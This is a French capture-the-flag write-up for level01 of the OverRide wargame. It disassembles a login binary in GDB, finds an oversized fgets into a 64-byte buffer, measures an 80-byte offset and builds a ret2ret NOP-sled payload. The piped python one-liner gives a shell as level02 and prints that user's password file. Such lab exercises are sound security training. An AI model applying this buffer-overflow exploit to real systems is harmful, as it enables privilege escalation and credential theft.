# level01: STACK OVERFLOW

### Testons notre programe !

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: level02
verifying username....

nope, incorrect username...
```
Ok nous devons je pense trouver le username et le mot de passe associer ! Allons y.

### Ouvrons **GDB**

```s
Dump of assembler code for function main:
   0x080484d0 <+0>:	push   %ebp
   0x080484d1 <+1>:	mov    %esp,%ebp
   0x080484d3 <+3>:	push   %edi
   0x080484d4 <+4>:	push   %ebx
   0x080484d5 <+5>:	and    $0xfffffff0,%esp
   0x080484d8 <+8>:	sub    $0x60,%esp
   0x080484db <+11>:	lea    0x1c(%esp),%ebx
   0x080484df <+15>:	mov    $0x0,%eax
   0x080484e4 <+20>:	mov    $0x10,%edx
   0x080484e9 <+25>:	mov    %ebx,%edi
   0x080484eb <+27>:	mov    %edx,%ecx
   0x080484ed <+29>:	rep stos %eax,%es:(%edi)
   0x080484ef <+31>:	movl   $0x0,0x5c(%esp)
   0x080484f7 <+39>:	movl   $0x80486b8,(%esp)
   0x080484fe <+46>:	call   0x8048380 <puts@plt>
   0x08048503 <+51>:	mov    $0x80486df,%eax
   0x08048508 <+56>:	mov    %eax,(%esp)
   0x0804850b <+59>:	call   0x8048360 <printf@plt>
   0x08048510 <+64>:	mov    0x804a020,%eax
   0x08048515 <+69>:	mov    %eax,0x8(%esp)
   0x08048519 <+73>:	movl   $0x100,0x4(%esp)
   0x08048521 <+81>:	movl   $0x804a040,(%esp)
   0x08048528 <+88>:	call   0x8048370 <fgets@plt>
   0x0804852d <+93>:	call   0x8048464 <verify_user_name>
   0x08048532 <+98>:	mov    %eax,0x5c(%esp)
   0x08048536 <+102>:	cmpl   $0x0,0x5c(%esp)
   0x0804853b <+107>:	je     0x8048550 <main+128>
   0x0804853d <+109>:	movl   $0x80486f0,(%esp)
   0x08048544 <+116>:	call   0x8048380 <puts@plt>
   0x08048549 <+121>:	mov    $0x1,%eax
   0x0804854e <+126>:	jmp    0x80485af <main+223>
   0x08048550 <+128>:	movl   $0x804870d,(%esp)
   0x08048557 <+135>:	call   0x8048380 <puts@plt>
   0x0804855c <+140>:	mov    0x804a020,%eax
   0x08048561 <+145>:	mov    %eax,0x8(%esp)
   0x08048565 <+149>:	movl   $0x64,0x4(%esp)
   0x0804856d <+157>:	lea    0x1c(%esp),%eax
   0x08048571 <+161>:	mov    %eax,(%esp)
   0x08048574 <+164>:	call   0x8048370 <fgets@plt>
   0x08048579 <+169>:	lea    0x1c(%esp),%eax
   0x0804857d <+173>:	mov    %eax,(%esp)
   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
   0x08048585 <+181>:	mov    %eax,0x5c(%esp)
   0x08048589 <+185>:	cmpl   $0x0,0x5c(%esp)
   0x0804858e <+190>:	je     0x8048597 <main+199>
   0x08048590 <+192>:	cmpl   $0x0,0x5c(%esp)
   0x08048595 <+197>:	je     0x80485aa <main+218>
   0x08048597 <+199>:	movl   $0x804871e,(%esp)
   0x0804859e <+206>:	call   0x8048380 <puts@plt>
   0x080485a3 <+211>:	mov    $0x1,%eax
   0x080485a8 <+216>:	jmp    0x80485af <main+223>
   0x080485aa <+218>:	mov    $0x0,%eax
   0x080485af <+223>:	lea    -0x8(%ebp),%esp
   0x080485b2 <+226>:	pop    %ebx
   0x080485b3 <+227>:	pop    %edi
   0x080485b4 <+228>:	pop    %ebp
   0x080485b5 <+229>:	ret  
```
> _**Remarque:**_ Meme si nous rentrons le bon password celui ci serra errone et de toute maniere il n'y a aucune condition qui execute un call system. Par contre nous pouvons voir qu'il y'a un probleme de securite dans le code si nous regardons de plus pres le fgets du password

### ASSEMBLY TO C

```c
unsigned char password[64];
fgets((char *)password, 100, stdin);
```
- Il y'a un risque d'**overflow** de **fgets()** car son n_size depasse le **buffer** mis en parametres, cherchons le **segfault** !

Clique [**ICI**](./Ressources/main.c) si tu veux voir tous le code en **C**

### OFFSET
```bash
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDEEEEFFFF
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x46464646 in ?? ()
```
> _**MON OFFSET EST DE 80**_

### EXPLOIT: NOP_SLED RET2RET
- adresse du nop_sled dans l'environement -> 0xffffdc3d
- adresse d'une instruction ret dans le main ->0x080485b5

```bash
python -c 'print "A"*80 + "\x08\x04\x85\xb5"[::-1] + "\xff\xff\xdc\x3d"[::-1]
```

### EXEC

```bash
level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "A"*80 + "\x08\x04\x85\xb5"[::-1] + "\xff\xff\xdc\x3d"[::-1]') | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

$ whoami
level02
$ cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

**CONGRATULATIONS — you owned it ! 🎉**

### SOURCES

- [**shellcode**](http://shell-storm.org/shellcode/files/shellcode-219.html)
- [**nop_sled**](https://www.youtube.com/watch?v=1S0aBV-Waeo&t=818s)
- [**codeOp**](http://ref.x86asm.net/coder.html)
